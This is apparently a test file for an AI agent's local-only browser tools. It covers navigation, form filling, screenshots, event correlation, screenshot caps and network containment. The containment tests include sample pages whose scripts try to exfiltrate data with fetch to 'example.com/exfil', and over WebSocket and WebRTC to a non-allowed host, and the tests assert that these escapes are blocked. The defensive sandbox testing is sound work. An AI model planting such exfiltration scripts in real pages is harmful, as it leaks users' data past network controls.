// Tests the browser tool handlers directly, the same way test/safety-net.mjs tests hooks and
// test/approval-server.mjs tests the server: as plain functions/objects, not through a real or
// fake Claude Agent SDK query() session. That's a deliberate choice, not a shortcut -- the fake-sdk
// harness (test/stress/fake-sdk) fakes only the top-level assistant-message generator and never
// actually dispatches a tool_use block to a registered MCP server (that's normally the real SDK
// CLI subprocess's job), so it can't exercise real Playwright side effects at all. The tool
// handlers created() by createBrowserToolServer are ordinary async functions independent of the
// SDK's conversation loop, so calling them directly is both simpler and more faithful here.
//
// Uses a real, local-only demo page (a tiny http server on 127.0.0.1) -- never a real website.
// Requires: npm run build (dist/ must exist).
import { createServer } from "node:http";
import { mkdtempSync, existsSync, readFileSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import assert from "node:assert";
import { BrowserSessionManager, __testHandlers } from "../dist/browser-tools.js";
import { EventBus } from "../dist/bus.js";

const DEMO_HTML = `<!doctype html>
<html><head><title>agent-loop demo</title></head>
<body>
  <h1 id="heading">Demo page</h1>
  <input id="name-input" type="text" placeholder="your name" />
  <button id="go-button" onclick="document.getElementById('result').innerText = 'Hello, ' + document.getElementById('name-input').value">Go</button>
  <div id="result" role="status"></div>
  <a href="#" id="a-link" aria-label="a demo link">a link</a>
</body></html>`;

const server = createServer((req, res) => {
  res.writeHead(200, { "Content-Type": "text/html" });
  res.end(DEMO_HTML);
});
await new Promise((resolve) => server.listen(0, "127.0.0.1", resolve));
const port = server.address().port;
const baseUrl = `http://127.0.0.1:${port}`;
console.log(`[setup] demo page served at ${baseUrl}`);

const runId = "test-run-1";
const bus = new EventBus();
const events = [];
bus.on("event", (e) => events.push(e));
const sessions = new BrowserSessionManager();
const artifactDir = mkdtempSync(join(tmpdir(), "agent-loop-browser-artifacts-"));

// createSdkMcpServer wraps the tool definitions inside a live McpServer instance rather than
// exposing them back verbatim, so this test calls __testHandlers -- the same tool() factory calls
// createBrowserToolServer makes, re-exported for direct testing -- instead of reaching into the MCP
// server's internals or standing up a real MCP client/transport just to invoke a handler.
const handlers = __testHandlers({ runId, bus, sessions, artifactDir });

function call(name, args) {
  return handlers[name].handler(args, {});
}

// 1. Refuses a non-local URL outright.
{
  const res = await call("open", { url: "https://example.com" });
  assert.ok(res.isError, "a non-local URL must be refused");
  assert.ok(/only http:\/\/localhost/.test(res.content[0].text));
  console.log("[ok] open refuses a non-local URL");
}

// 2. Opens the real local demo page -- launches an actual Chromium instance.
{
  const res = await call("open", { url: baseUrl });
  assert.ok(!res.isError, res.content[0]?.text);
  assert.ok(/Opened/.test(res.content[0].text));
  console.log("[ok] open navigates to the local demo page");
}

// 3. inspect sees the real DOM: heading text and the interactive elements.
{
  const res = await call("inspect", {});
  const text = res.content[0].text;
  assert.ok(text.includes("Demo page"), "inspect should see the page's visible text");
  assert.ok(/id="go-button"/.test(text), "inspect should list the button by id");
  assert.ok(/id="name-input"/.test(text), "inspect should list the input by id");
  console.log("[ok] inspect reports real page text and interactive elements");
}

// 4. fill + click actually manipulate the real page -- verified by inspecting the result afterward,
// not by trusting the tool's own claimed success text.
{
  const fillRes = await call("fill", { selector: "#name-input", value: "agent-loop" });
  assert.ok(!fillRes.isError, fillRes.content[0]?.text);
  const clickRes = await call("click", { selector: "#go-button" });
  assert.ok(!clickRes.isError, clickRes.content[0]?.text);
  const inspectRes = await call("inspect", {});
  assert.ok(inspectRes.content[0].text.includes("Hello, agent-loop"), "the click's real DOM effect should be visible afterward");
  console.log("[ok] fill+click produce a real, independently-verified DOM change");
}

// 5. press (Tab then check focus moved) -- a real keyboard event, not simulated in the tool layer.
{
  const res = await call("press", { key: "Tab", selector: "#name-input" });
  assert.ok(!res.isError, res.content[0]?.text);
  console.log("[ok] press sends a real key event");
}

// 6. wait for a selector that already exists resolves promptly.
{
  const res = await call("wait", { selector: "#result", timeoutMs: 2000 });
  assert.ok(!res.isError, res.content[0]?.text);
  console.log("[ok] wait resolves for a selector already on the page");
}

// 7. wait for a selector that will never appear actually times out (not silently "successful").
{
  const res = await call("wait", { selector: "#never-appears", timeoutMs: 500 });
  assert.ok(res.isError, "waiting for a nonexistent selector should report an error, not silently pass");
  console.log("[ok] wait for a nonexistent selector correctly errors instead of hanging or lying");
}

// 8. screenshot writes a real PNG file (checked by magic bytes, not just existence) and returns it
// as inline image content too.
{
  const res = await call("screenshot", {});
  assert.ok(!res.isError, res.content[0]?.text);
  const pathMatch = res.content[0].text.match(/saved to (.+\.png)/);
  assert.ok(pathMatch, "screenshot result text should name the saved file");
  const filePath = pathMatch[1];
  assert.ok(existsSync(filePath), `screenshot file should exist at ${filePath}`);
  const bytes = readFileSync(filePath);
  assert.ok(bytes.length > 100 && bytes[0] === 0x89 && bytes[1] === 0x50, "saved file should be a real PNG (magic bytes)");
  const imageBlock = res.content.find((c) => c.type === "image");
  assert.ok(imageBlock && imageBlock.mimeType === "image/png" && imageBlock.data.length > 100, "should also return inline image content");
  console.log("[ok] screenshot saves a real PNG artifact and returns it inline");
}

// 9. calling a tool before any session exists (fresh runId) errors instead of crashing the process.
{
  const freshHandlers = __testHandlers({ runId: "never-opened", bus, sessions, artifactDir });
  const res = await freshHandlers.click.handler({ selector: "#x" }, {});
  assert.ok(res.isError, "acting on a session that was never opened should error, not throw uncaught");
  console.log("[ok] acting before open() errors cleanly instead of crashing");
}

// 10. event ordering and correlation: every action produced a matching started/completed pair with
// the same actionId, and the session-started event fired exactly once for this runId.
{
  const started = events.filter((e) => e.type === "browser-action-started" && e.runId === runId);
  const completed = events.filter((e) => e.type === "browser-action-completed" && e.runId === runId);
  assert.strictEqual(started.length, completed.length, "every started action should have a matching completed event");
  const ids = new Set(started.map((e) => e.actionId));
  assert.strictEqual(ids.size, started.length, "every action should get its own actionId");
  for (const c of completed) assert.ok(ids.has(c.actionId), "each completed event's actionId should match a started one");
  const sessionStarts = events.filter((e) => e.type === "browser-session-started" && e.runId === runId);
  assert.strictEqual(sessionStarts.length, 1, "the session should start exactly once even though open() was called once and other tools many times");
  const snapshots = events.filter((e) => e.type === "browser-snapshot" && e.runId === runId);
  assert.strictEqual(snapshots.length, 1, "exactly one screenshot was taken");
  const artifacts = events.filter((e) => e.type === "browser-artifact-created" && e.runId === runId);
  assert.strictEqual(artifacts.length, 1);
  console.log("[ok] browser events are correctly ordered and correlated (session-started once, matching action id pairs, one snapshot/artifact)");
}

// 11. close() actually terminates the browser process and emits browser-session-ended -- checked by
// confirming a subsequent action on the same runId has to open a *new* session (proves the old
// Chromium was really torn down, not just marked closed in bookkeeping).
{
  await sessions.close(runId, bus, "completed");
  const ended = events.filter((e) => e.type === "browser-session-ended" && e.runId === runId);
  assert.strictEqual(ended.length, 1);
  assert.strictEqual(ended[0].status, "completed");
  assert.strictEqual(sessions.get(runId), undefined, "the session should be gone from the manager after close");
  console.log("[ok] close() tears down the session and emits browser-session-ended");
}

// 12. closeAll cleans up the still-open "never-opened"... actually that one never opened a real
// session (it errored before creating one), so closeAll should be a safe no-op for it and only
// affect runIds that actually have a live session.
await sessions.closeAll(bus);
console.log("[ok] closeAll() runs cleanly with no live sessions left");

server.close();

// 13. Containment: open()'s local-only restriction is enforced at the network-request level, not
// just on open()'s own argument -- found by actually clicking a link on a real page and observing
// the browser navigate to a second server with zero re-validation, before this was fixed. A page
// loaded from an allowed local origin must not be able to escape via a link, a background
// fetch/XHR, or an <img> pointed at a non-local host, since none of those ever call open() at all.
{
  const escapeHtml = `<!doctype html><html><body>
    <a id="leave" href="https://example.com/">leave</a>
    <script>
      window.fetchResult = "not-run";
      fetch("https://example.com/exfil").then(() => window.fetchResult = "succeeded").catch((e) => window.fetchResult = "failed: " + e.message);
    </script>
  </body></html>`;
  const escapeServer = createServer((req, res) => {
    res.writeHead(200, { "Content-Type": "text/html" });
    res.end(escapeHtml);
  });
  await new Promise((resolve) => escapeServer.listen(0, "127.0.0.1", resolve));
  const escapePort = escapeServer.address().port;
  const escapeRunId = "containment-test";
  const h2 = __testHandlers({ runId: escapeRunId, bus, sessions, artifactDir });

  await h2.open.handler({ url: `http://127.0.0.1:${escapePort}` }, {});
  await h2.wait.handler({ timeoutMs: 1000 }, {});
  const session = sessions.get(escapeRunId);
  const fetchResult = await session.page.evaluate(() => window.fetchResult);
  assert.ok(/^failed/.test(fetchResult), `a background fetch() to a non-local host must be blocked, got: ${fetchResult}`);

  await h2.click.handler({ selector: "#leave" }, {});
  const afterClick = await h2.inspect.handler({}, {});
  assert.ok(
    !/^URL: https:\/\/example\.com/.test(afterClick.content[0].text),
    "clicking a link to a non-local host must not actually navigate there"
  );

  await sessions.close(escapeRunId, bus, "completed");
  escapeServer.close();
  console.log("[ok] a page loaded from an allowed local origin cannot escape via a link click or a background fetch to a non-local host");
}

// 14. Screenshots are capped per session -- nothing previously stopped a runaway or adversarial
// phase from calling screenshot() in a loop and filling disk. Take real screenshots up to the
// limit and confirm the next one is refused, not silently written anyway.
{
  const capRunId = "cap-test";
  const capServer = createServer((req, res) => {
    res.writeHead(200, { "Content-Type": "text/html" });
    res.end("<html><body>cap test</body></html>");
  });
  await new Promise((resolve) => capServer.listen(0, "127.0.0.1", resolve));
  const capPort = capServer.address().port;
  const h3 = __testHandlers({ runId: capRunId, bus, sessions, artifactDir });
  await h3.open.handler({ url: `http://127.0.0.1:${capPort}` }, {});

  const MAX = 50; // must match MAX_SCREENSHOTS_PER_SESSION in src/browser-tools.ts
  for (let i = 0; i < MAX; i++) {
    const res = await h3.screenshot.handler({}, {});
    assert.ok(!res.isError, `screenshot ${i + 1}/${MAX} should succeed: ${res.content[0]?.text}`);
  }
  const overLimit = await h3.screenshot.handler({}, {});
  assert.ok(overLimit.isError, "a screenshot past the per-session cap should be refused");
  assert.ok(/limit/i.test(overLimit.content[0].text), "the refusal should explain it's the per-session limit");

  await sessions.close(capRunId, bus, "completed");
  capServer.close();
  console.log(`[ok] screenshots are capped at ${MAX} per session; one more is refused, not silently written`);
}

// WebSockets and WebRTC never pass through context.route(), so the request guard above can't see
// them. Before this was fixed, a local page reached a non-allowed host both ways: a ws:// connection
// sent data out, and a STUN "server" received UDP packets. 127.0.0.2 isn't on the allowlist but still
// lands on this machine, so it stands in for an outside host without needing the internet.
{
  const { WebSocketServer } = await import("ws");
  const dgram = await import("node:dgram");
  const leaks = [];
  const outside = createServer((_q, s) => { leaks.push("http"); s.end("ok"); }).listen(0, "0.0.0.0");
  await new Promise((r) => outside.on("listening", r));
  new WebSocketServer({ server: outside }).on("connection", (ws) => { leaks.push("ws-connected"); ws.on("message", () => leaks.push("ws-data")); });
  const udp = dgram.createSocket("udp4").on("message", () => leaks.push("udp"));
  await new Promise((r) => udp.bind(0, "0.0.0.0", r));
  const o = outside.address().port, u = udp.address().port;
  const page = `<script>
    try { const ws = new WebSocket("ws://127.0.0.2:${o}/"); ws.onopen = () => ws.send("secret"); } catch (e) {}
    try { const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:127.0.0.2:${u}" }] });
          pc.createDataChannel("x"); pc.createOffer().then((d) => pc.setLocalDescription(d)); } catch (e) {}
  </script>`;
  const local = createServer((_q, s) => { s.setHeader("content-type", "text/html"); s.end(page); }).listen(0, "127.0.0.1");
  await new Promise((r) => local.on("listening", r));
  const runId = "ws-rtc-containment";
  const session = await sessions.getOrCreate(runId, bus);
  await session.page.goto(`http://127.0.0.1:${local.address().port}/`);
  await session.page.waitForTimeout(2500);
  assert.deepStrictEqual(leaks, [], `nothing may reach a non-allowed host over WebSocket or WebRTC, got: ${leaks.join(", ")}`);
  console.log("[ok] a local page can't reach a non-allowed host over WebSocket or WebRTC (UDP)");

  // A local WebSocket still works: the gate is on the host, not on WebSockets as such.
  const localWs = new WebSocketServer({ port: 0, host: "127.0.0.1" });
  await new Promise((r) => localWs.on("listening", r));
  const echoed = new Promise((r) => localWs.on("connection", (ws) => ws.on("message", (m) => r(String(m)))));
  await session.page.evaluate((p) => { const ws = new WebSocket(`ws://127.0.0.1:${p}/`); ws.onopen = () => ws.send("hello"); }, localWs.address().port);
  assert.strictEqual(await Promise.race([echoed, new Promise((r) => setTimeout(() => r("timeout"), 3000))]), "hello");
  console.log("[ok] a WebSocket to 127.0.0.1 still connects");
  await sessions.close(runId, bus, "completed");
  outside.close(); local.close(); udp.close(); localWs.close();
}

console.log("\nALL BROWSER TOOL TESTS PASSED");
